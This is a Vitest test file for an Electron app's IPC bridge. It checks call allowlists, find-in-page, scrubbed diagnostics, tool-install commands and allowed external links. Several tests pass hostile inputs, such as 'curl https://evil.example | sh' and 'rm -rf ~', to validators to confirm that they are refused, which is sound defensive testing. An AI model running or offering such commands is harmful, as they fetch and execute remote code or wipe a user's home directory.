import { EventEmitter } from 'node:events'

import { afterEach, describe, expect, test, vi } from 'vitest'

const handlers = vi.hoisted(() => new Map<string, (...args: unknown[]) => unknown>())
const opened = vi.hoisted(() => [] as string[])
const shown = vi.hoisted(() => [] as string[])
vi.mock('electron', () => ({
  BrowserWindow: class {},
  clipboard: { writeText: () => undefined, readText: () => '' },
  ipcMain: { handle: (channel: string, fn: (...args: unknown[]) => unknown) => handlers.set(channel, fn) },
  shell: { openExternal: async (url: string) => void opened.push(url), showItemInFolder: (path: string) => void shown.push(path) }
}))

import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import type { BrowserWindow } from 'electron'

import { toolFlags, type ToolState, type ToolStatus } from '../shared/tools'
import { EngineError, type Engine } from './engine'
import { engineMethod, findRequest, parseKinds, registerIpc, type IpcDeps } from './ipc'
import type { SetupEvent, SetupFields } from './setupLog'
import { ToolWatch } from './toolWatch'

test('the call list is closed', () => {
  for (const name of ['constructor', '__proto__', 'toString', 'hasOwnProperty']) expect(engineMethod(name)).toBeNull()
  expect(engineMethod(42)).toBeNull()
  expect(engineMethod('getReport')).toBe('get_report')
})

test('the safety check can be stopped from the window', () => {
  expect(engineMethod('cancelSafetyCheck')).toBe('cancel_safety_check')
  expect(engineMethod('runSafetyCheck')).toBe('run_safety_check')
})

test('the report’s numbers have a call of their own', () => {
  expect(engineMethod('getReportNumbers')).toBe('get_report_numbers')
  expect(engineMethod('getAnalysts')).toBe('get_analysts')
})

test('the sidebar’s delete and pin calls reach the engine', () => {
  expect(engineMethod('hideReports')).toBe('hide_reports')
  expect(engineMethod('showReports')).toBe('show_reports')
  expect(engineMethod('eraseReports')).toBe('erase_reports')
  expect(engineMethod('pinCompany')).toBe('pin_company')
  expect(engineMethod('planLine')).toBe('plan_line')
  expect(engineMethod('addToLine')).toBe('add_to_line')
  expect(engineMethod('getLine')).toBe('get_line')
  expect(engineMethod('removeFromLine')).toBe('remove_from_line')
  expect(engineMethod('clearLine')).toBe('clear_line')
  expect(engineMethod('carryOnLine')).toBe('carry_on_line')
  expect(engineMethod('lineGroups')).toBe('line_groups')
})

test('a new or changed query starts a find session, and the same query steps through it', () => {
  expect(findRequest(null, 'Hold', true)).toEqual({ text: 'Hold', forward: true, findNext: true })
  expect(findRequest('Hold', 'Hold', true)).toEqual({ text: 'Hold', forward: true, findNext: false })
  expect(findRequest('Hold', 'Hold', false)).toEqual({ text: 'Hold', forward: false, findNext: false })
  expect(findRequest('Hol', 'Hold', true)?.findNext).toBe(true)
})

test('a find needs some text, goes forward unless told otherwise, and is capped at 200 characters', () => {
  expect(findRequest(null, '', true)).toBeNull()
  expect(findRequest(null, 42, true)).toBeNull()
  expect(findRequest(null, 'a', undefined)?.forward).toBe(true)
  const long = 'x'.repeat(250)
  expect(findRequest(null, long, true)?.text).toHaveLength(200)
  expect(findRequest('x'.repeat(200), long, true)?.findNext).toBe(false)
})

// A window as Electron gives it: once it has closed, even reading its webContents throws
// "Object has been destroyed".
function openWindow() {
  let destroyed = false
  const contents = Object.assign(new EventEmitter(), {
    send: vi.fn(),
    findInPage: vi.fn(() => 1),
    stopFindInPage: vi.fn(),
    isDestroyed: () => destroyed
  })
  const window = {
    isDestroyed: () => destroyed,
    get webContents() {
      if (destroyed) throw new TypeError('Object has been destroyed')
      return contents
    }
  }
  const close = () => {
    destroyed = true
  }
  return { window: window as unknown as BrowserWindow, contents, close }
}

const tool = (kind: 'claude' | 'codex', state: ToolState): ToolStatus => ({
  kind,
  name: kind === 'claude' ? 'Claude Code' : 'Codex',
  path: state === 'missing' ? null : `/Users/you/.local/bin/${kind}`,
  ...toolFlags(state),
  version: null,
  reason: null,
  state,
  plan: null,
  email: null
})

let tools: ToolStatus[] = [tool('claude', 'missing'), tool('codex', 'ready')]

function wired(over: Partial<IpcDeps> & { request?: (method: string, params: unknown) => Promise<unknown> } = {}) {
  const { window, contents, close } = openWindow()
  const engine = Object.assign(new EventEmitter(), { fatalMessage: null, request: over.request ?? (async () => ({})) }) as unknown as Engine
  const watch = new ToolWatch({ probe: async () => tools })
  const entries: [SetupEvent, SetupFields][] = []
  const copied: string[] = []
  registerIpc(window, engine, {
    watch,
    rules: { noRealInstallers: false, home: '/Users/you' },
    log: { log: (event, fields = {}) => void entries.push([event, fields]) },
    copyAndOpen: async (command) => {
      copied.push(command)
      return { copied: true, opened: true }
    },
    ...over
  })
  return { engine, contents, close, watch, entries, copied }
}

afterEach(() => {
  handlers.clear()
  vi.useRealTimers()
  tools = [tool('claude', 'missing'), tool('codex', 'ready')]
})

test('the engine’s notes reach the open window', () => {
  const { engine, contents } = wired()
  const note = { method: 'progress', params: { step: 3 } }
  engine.emit('notification', note)
  engine.emit('crashed', 'run-1')
  engine.emit('fatal', 'The engine couldn’t start.')
  expect(contents.send.mock.calls).toEqual([
    ['tearsheet:notification', note],
    ['tearsheet:notification', { method: 'engine_restarted', params: { run_id: 'run-1' } }],
    ['tearsheet:notification', { method: 'engine_fatal', params: { message: 'The engine couldn’t start.' } }]
  ])
})

// Quitting while a report runs: the window closes while the engine is still stopping, and the
// report's last progress notes arrive after it. Sending them threw in the main process, and
// Electron's error box then held the quit up.
test('notes that arrive after the window has closed are dropped, not thrown', () => {
  const { engine, contents, close } = wired()
  close()
  expect(() => engine.emit('notification', { method: 'run_tally', params: {} })).not.toThrow()
  expect(() => engine.emit('crashed', 'run-1')).not.toThrow()
  expect(() => engine.emit('fatal', 'The engine stopped.')).not.toThrow()
  expect(contents.send).not.toHaveBeenCalled()
})

test('a find still waiting when the window closes ends quietly', async () => {
  vi.useFakeTimers()
  const { close } = wired()
  const found = handlers.get('tearsheet:find')!({}, 'Hold', true) as Promise<void>
  close()
  expect(() => vi.advanceTimersByTime(1000)).not.toThrow()
  await expect(found).resolves.toBeUndefined()
})

test('About and help gets the versions, and Send feedback opens a filled-in email', async () => {
  const info = { app: '0.1.0', engine: '0.1.0', macos: '26.1', electron: '33.2.0' }
  wired({ about: () => info })
  expect(handlers.get('tearsheet:about')!()).toEqual(info)
  opened.length = 0
  expect(await handlers.get('tearsheet:sendFeedback')!()).toBe(true)
  expect(opened).toHaveLength(1)
  expect(opened[0].startsWith('mailto:')).toBe(true)
  expect(decodeURIComponent(opened[0])).toContain('Tearsheet 0.1.0')
})

test('Copy diagnostics puts the versions, the tools and the scrubbed end of engine.log on the clipboard', async () => {
  const dir = mkdtempSync(join(tmpdir(), 'ipc-diag-'))
  try {
    const logFile = join(dir, 'engine.log')
    writeFileSync(logFile, 'started in /Users/you/Library\nSEC contact you@example.com\n')
    const pasted: string[] = []
    const { watch } = wired({
      about: () => ({ app: '0.1.0-beta', engine: '0.1.0', macos: '26.1', electron: '33.2.0' }),
      request: async (method) => (method === 'get_settings' ? { primary_tool: 'codex' } : {}),
      engineLogFile: logFile,
      home: '/Users/you',
      writeClipboard: (text) => void pasted.push(text)
    })
    await watch.read()
    expect(await handlers.get('tearsheet:copyDiagnostics')!()).toBe(true)
    expect(pasted).toHaveLength(1)
    const text = pasted[0]
    expect(text).toContain('Tearsheet 0.1.0-beta')
    expect(text).toContain('Reports use: codex')
    expect(text).toContain('started in ~/Library')
    expect(text).toContain('SEC contact [email]')
    expect(text).not.toContain('you@example.com')
    expect(text).not.toContain('/Users/you')
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('Copy diagnostics doesn’t wait long for an engine that doesn’t answer', async () => {
  vi.useFakeTimers()
  const pasted: string[] = []
  wired({ request: () => new Promise(() => undefined), writeClipboard: (text) => void pasted.push(text) })
  const done = handlers.get('tearsheet:copyDiagnostics')!() as Promise<boolean>
  await vi.advanceTimersByTimeAsync(2000)
  expect(await done).toBe(true)
  expect(pasted[0]).not.toContain('Reports use')
  expect(pasted[0]).toContain('No engine.log yet.')
})

describe('the tools', () => {
  test('getTools goes through the watcher, so reads are shared', async () => {
    const probe = vi.fn(async () => tools)
    wired({ watch: new ToolWatch({ probe }) })
    const get = handlers.get('tearsheet:getTools')!
    await Promise.all([get({}, false), get({}, true)])
    expect(probe).toHaveBeenCalledTimes(1)
    await get({}, false)
    expect(probe).toHaveBeenCalledTimes(1)
    await get({}, true)
    expect(probe).toHaveBeenCalledTimes(2)
  })

  test('a change in the tools reaches the window as tools_changed', async () => {
    const { contents, watch } = wired()
    await watch.read()
    expect(contents.send).toHaveBeenCalledWith('tearsheet:notification', { method: 'tools_changed', params: { tools } })
  })

  test('windowState tells the watcher whether the screen waits on the person', () => {
    const { watch } = wired()
    const waiting = vi.spyOn(watch, 'setWaiting')
    handlers.get('tearsheet:windowState')!({}, { waiting: true })
    handlers.get('tearsheet:windowState')!({}, { waiting: 'yes' })
    handlers.get('tearsheet:windowState')!({}, null)
    expect(waiting.mock.calls).toEqual([[true], [false], [false]])
  })
})

describe('the commands, built only in the main process', () => {
  test('parseKinds takes only the known tools', () => {
    expect(parseKinds(['claude'])).toEqual(['claude'])
    expect(parseKinds(['codex', 'claude', 'codex'])).toBeNull()
    expect(parseKinds(['codex', 'codex'])).toEqual(['codex'])
    for (const bad of ['claude', [], ['claude', 'codex', 'x'], ['curl https://evil.example | sh'], [{ command: 'x' }], null, { 0: 'claude', length: 1 }]) expect(parseKinds(bad)).toBeNull()
  })

  test('commandsFor gives the exact commands for the connect card, from the tools’ status', async () => {
    wired()
    const answer = await handlers.get('tearsheet:commandsFor')!({}, ['claude', 'codex'])
    expect(answer).toEqual({
      steps: [
        { tool: 'claude', kind: 'install', command: 'curl -fsSL https://claude.ai/install.sh | bash' },
        { tool: 'claude', kind: 'signIn', command: '/Users/you/.local/bin/claude auth login' }
      ],
      blocked: [],
      paste: 'set -o pipefail; curl -fsSL https://claude.ai/install.sh | bash && /Users/you/.local/bin/claude auth login'
    })
    expect(await handlers.get('tearsheet:commandsFor')!({}, 'rm -rf ~')).toEqual({ steps: [], blocked: [], paste: null })
  })

  test('copyAndOpenTerminal copies the command the main process builds', async () => {
    const { copied } = wired()
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: true, opened: true })
    expect(copied).toEqual(['set -o pipefail; curl -fsSL https://claude.ai/install.sh | bash && /Users/you/.local/bin/claude auth login'])
  })

  test('the window can never send command text', async () => {
    const { copied } = wired()
    const send = handlers.get('tearsheet:copyAndOpenTerminal')!
    for (const bad of ['curl https://evil.example | sh', ['curl https://evil.example | sh'], [{ command: 'rm -rf ~' }], { kinds: ['claude'], command: 'x' }, undefined]) {
      expect(await send({}, bad)).toEqual({ copied: false, opened: false })
    }
    expect(copied).toEqual([])
  })

  test('nothing to set up copies nothing', async () => {
    const { copied } = wired()
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['codex'])).toEqual({ copied: false, opened: false })
    expect(copied).toEqual([])
  })
})

describe('the setup log', () => {
  test('key-check answers are logged by their code only', async () => {
    let answer: () => Promise<unknown> = async () => ({ proof: 'Massive answered for AAPL' })
    const { entries } = wired({ request: () => answer() })
    const call = handlers.get('tearsheet:call')!
    await call({}, 'checkKey', { service: 'massive', key: 'abcdefghijklmnopqrstuvwxyz' })
    answer = async () => {
      throw new EngineError('Massive refused the key abcdefghijklmnopqrstuvwxyz', 1, { code: 'KEY_REJECTED' })
    }
    await call({}, 'checkKey', { service: 'massive', key: 'abcdefghijklmnopqrstuvwxyz' })
    answer = async () => {
      throw new Error('The engine stopped.')
    }
    await call({}, 'checkKey', { service: 'massive', key: 'k' })
    await call({}, 'getSettings', {})
    expect(entries).toEqual([
      ['key_check', { code: 'ok' }],
      ['key_check', { code: 'KEY_REJECTED' }],
      ['key_check', { code: 'error' }]
    ])
  })

  test('Show log in Finder selects logs/setup.log, once it exists', () => {
    const dir = mkdtempSync(join(tmpdir(), 'tearsheet-ipc-test-'))
    try {
      const file = join(dir, 'setup.log')
      shown.length = 0
      wired({ setupLogFile: file })
      expect(handlers.get('tearsheet:showSetupLog')!()).toBe(false)
      writeFileSync(file, '')
      expect(handlers.get('tearsheet:showSetupLog')!()).toBe(true)
      expect(shown).toEqual([file])
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
})

describe('the Install button', () => {
  function installer(order: string[] = []) {
    return {
      run: vi.fn(async (kinds: ('claude' | 'codex')[]) => {
        order.push(`run ${kinds.join(',')}`)
        return { outcome: 'done' as const }
      }),
      cancel: vi.fn(async () => {
        await new Promise((resolve) => setTimeout(resolve, 5))
        order.push('cancelled')
        return true
      }),
      openSignInPage: vi.fn(async () => true)
    }
  }

  test('with the switch off, the install calls aren’t there at all, and the button reads off', () => {
    wired()
    for (const channel of ['tearsheet:install', 'tearsheet:cancelInstall', 'tearsheet:openSignInPage']) expect(handlers.has(channel)).toBe(false)
    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(false)
  })

  test('getInstallButton answers what the online off switch says, with or without the installer', () => {
    let on = true
    wired({ installButton: () => on })
    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(true)
    on = false
    expect(handlers.get('tearsheet:getInstallButton')!()).toBe(false)
  })

  test('install runs the tools the window names, and nothing else', async () => {
    const fake = installer()
    wired({ installer: fake })
    const install = handlers.get('tearsheet:install')!
    expect(await install({}, ['claude', 'codex'])).toEqual({ outcome: 'done' })
    expect(fake.run).toHaveBeenCalledWith(['claude', 'codex'])
    for (const bad of ['claude', ['curl https://evil.example | sh'], [{ command: 'x' }], undefined, []]) {
      expect(await install({}, bad)).toEqual({ outcome: 'refused' })
    }
    expect(fake.run).toHaveBeenCalledTimes(1)
  })

  test('cancelInstall stops the sign-in; openSignInPage takes no link from the window', async () => {
    const fake = installer()
    wired({ installer: fake })
    expect(await handlers.get('tearsheet:cancelInstall')!({})).toBe(true)
    expect(fake.cancel).toHaveBeenCalledTimes(1)
    expect(await handlers.get('tearsheet:openSignInPage')!({}, 'https://evil.example/')).toBe(true)
    expect(fake.openSignInPage).toHaveBeenCalledWith()
  })

  test('copying the paste command stops a sign-in under way first', async () => {
    const order: string[] = []
    const fake = installer(order)
    const { copied } = wired({
      installer: fake,
      copyAndOpen: async (command) => {
        order.push('copied')
        copied.push(command)
        return { copied: true, opened: true }
      }
    })
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: true, opened: true })
    expect(order).toEqual(['cancelled', 'copied'])
  })

  test('the old Open Terminal call is gone', () => {
    wired({ installer: installer() })
    expect(handlers.has('tearsheet:openTerminal')).toBe(false)
  })
})

describe('the rest of the bridge', () => {
  test('a call the list doesn’t have never reaches the engine', async () => {
    const request = vi.fn(async () => ({}))
    wired({ request })
    expect(await handlers.get('tearsheet:call')!({}, 'shutdown', {})).toEqual({ ok: false, error: { message: 'Unknown call shutdown.' } })
    expect(request).not.toHaveBeenCalled()
  })

  test('a call goes to its engine method, with empty params when none are given, and a run’s id is kept', async () => {
    const request = vi.fn(async (method: string) => (method === 'run_report' || method === 'resume' ? { run_id: `${method}-1` } : { fine: true }))
    const { engine } = wired({ request })
    const call = handlers.get('tearsheet:call')!
    expect(await call({}, 'getSettings', undefined)).toEqual({ ok: true, result: { fine: true } })
    expect(request).toHaveBeenLastCalledWith('get_settings', {})
    await call({}, 'runReport', { query: 'AAPL' })
    expect((engine as unknown as { lastRunId: string }).lastRunId).toBe('run_report-1')
    await call({}, 'resume', { run_id: 'x' })
    expect((engine as unknown as { lastRunId: string }).lastRunId).toBe('resume-1')
  })

  test('engine errors come back with their code and data; other errors with their message', async () => {
    let fail: Error = new EngineError('No such report.', 1, { code: 'NOT_FOUND', report_id: 'r' })
    const { entries } = wired({
      request: async () => {
        throw fail
      }
    })
    const call = handlers.get('tearsheet:call')!
    expect(await call({}, 'getReport', {})).toEqual({ ok: false, error: { message: 'No such report.', code: 'NOT_FOUND', data: { code: 'NOT_FOUND', report_id: 'r' } } })
    fail = new EngineError('The key was refused.', 1, {})
    await call({}, 'checkKey', {})
    expect(entries).toEqual([['key_check', { code: 'error' }]])
    fail = new Error('The engine stopped.')
    expect(await call({}, 'getReport', {})).toEqual({ ok: false, error: { message: 'The engine stopped.' } })
  })

  test('the update banner: its status, the setting, Dismiss, and links only to the shown release and the changelog', async () => {
    const release = { version: '0.2.0', url: 'https://github.com/LBB2005/Tearsheet/releases/tag/v0.2.0', prerelease: false }
    let shown: typeof release | null = release
    const updates = {
      status: vi.fn(() => ({ check: true, update: shown })),
      setCheck: vi.fn((on: boolean) => ({ check: on, update: on ? shown : null })),
      dismiss: vi.fn(() => {
        shown = null
        return { check: true, update: null }
      }),
      shown: vi.fn(() => shown)
    }
    wired({ updates })
    opened.length = 0
    expect(await handlers.get('tearsheet:updates')!({})).toEqual({ check: true, update: release })
    expect(await handlers.get('tearsheet:setUpdateCheck')!({}, 'yes')).toEqual({ check: false, update: null })
    expect(updates.setCheck).toHaveBeenLastCalledWith(false)
    await handlers.get('tearsheet:setUpdateCheck')!({}, true)
    expect(updates.setCheck).toHaveBeenLastCalledWith(true)
    const open = handlers.get('tearsheet:openUpdate')!
    expect(await open({}, 'download')).toBe(true)
    expect(await open({}, 'notes')).toBe(true)
    expect(await open({}, 'https://evil.example/')).toBe(false)
    expect(opened).toEqual([release.url, 'https://github.com/LBB2005/Tearsheet/blob/main/CHANGELOG.md'])
    expect(await handlers.get('tearsheet:dismissUpdate')!({}, '0.2.0')).toEqual({ check: true, update: null })
    expect(updates.dismiss).toHaveBeenCalledWith('0.2.0')
    // Nothing shown: neither link opens.
    expect(await open({}, 'download')).toBe(false)
  })

  test('without an update check, the window hears the setting is on and there is no update', async () => {
    wired()
    for (const channel of ['tearsheet:updates', 'tearsheet:setUpdateCheck', 'tearsheet:dismissUpdate']) expect(await handlers.get(channel)!({}, true)).toEqual({ check: true, update: null })
    expect(await handlers.get('tearsheet:openUpdate')!({}, 'download')).toBe(false)
  })

  test('openExternal opens only the allowed pages', async () => {
    wired()
    opened.length = 0
    const open = handlers.get('tearsheet:openExternal')!
    expect(await open({}, 'https://massive.com/dashboard')).toBe(true)
    for (const bad of ['https://evil.example/', 'https://nodejs.org', 'https://claude.com/cai/oauth/authorize', 42]) expect(await open({}, bad)).toBe(false)
    expect(opened).toEqual(['https://massive.com/dashboard'])
  })

  test('a find answers once its last result arrives, and stopping or a new page ends the session', async () => {
    const { contents } = wired()
    const find = handlers.get('tearsheet:find')!
    expect(find({}, '', true)).toBeUndefined()
    const done = find({}, 'Hold', true) as Promise<void>
    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: true })
    contents.emit('found-in-page', {}, { requestId: 2, finalUpdate: true })
    contents.emit('found-in-page', {}, { requestId: 1, finalUpdate: false })
    contents.emit('found-in-page', {}, { requestId: 1, finalUpdate: true })
    await expect(done).resolves.toBeUndefined()
    expect(contents.listenerCount('found-in-page')).toBe(0)
    // The same query again steps through it.
    void find({}, 'Hold', true)
    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: false })
    handlers.get('tearsheet:stopFind')!()
    expect(contents.stopFindInPage).toHaveBeenCalledWith('clearSelection')
    void find({}, 'Hold', true)
    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: true, findNext: true })
    contents.emit('did-frame-navigate')
    void find({}, 'Hold', false)
    expect(contents.findInPage).toHaveBeenLastCalledWith('Hold', { forward: false, findNext: true })
  })

  test('an engine that failed before the page loaded is told again once it has', () => {
    const { engine, contents } = wired()
    contents.emit('did-finish-load')
    expect(contents.send).not.toHaveBeenCalled()
    ;(engine as unknown as { fatalMessage: string }).fatalMessage = 'The engine couldn’t start.'
    contents.emit('did-finish-load')
    expect(contents.send).toHaveBeenCalledWith('tearsheet:notification', { method: 'engine_fatal', params: { message: 'The engine couldn’t start.' } })
  })

  test('with nothing optional given: no log, empty About, and the real copy (whose clipboard here reads back nothing)', async () => {
    const { window } = openWindow()
    const engine = Object.assign(new EventEmitter(), { fatalMessage: null, request: async () => ({}) }) as unknown as Engine
    registerIpc(window, engine, { watch: new ToolWatch({ probe: async () => tools }), rules: { noRealInstallers: false, home: '/Users/you' } })
    expect(handlers.get('tearsheet:about')!()).toEqual({ app: '', engine: null, macos: '', electron: '' })
    expect(await handlers.get('tearsheet:copyAndOpenTerminal')!({}, ['claude'])).toEqual({ copied: false, opened: false })
    expect(await handlers.get('tearsheet:call')!({}, 'checkKey', {})).toEqual({ ok: true, result: {} })
    expect(handlers.get('tearsheet:showSetupLog')!()).toBe(false)
  })
})
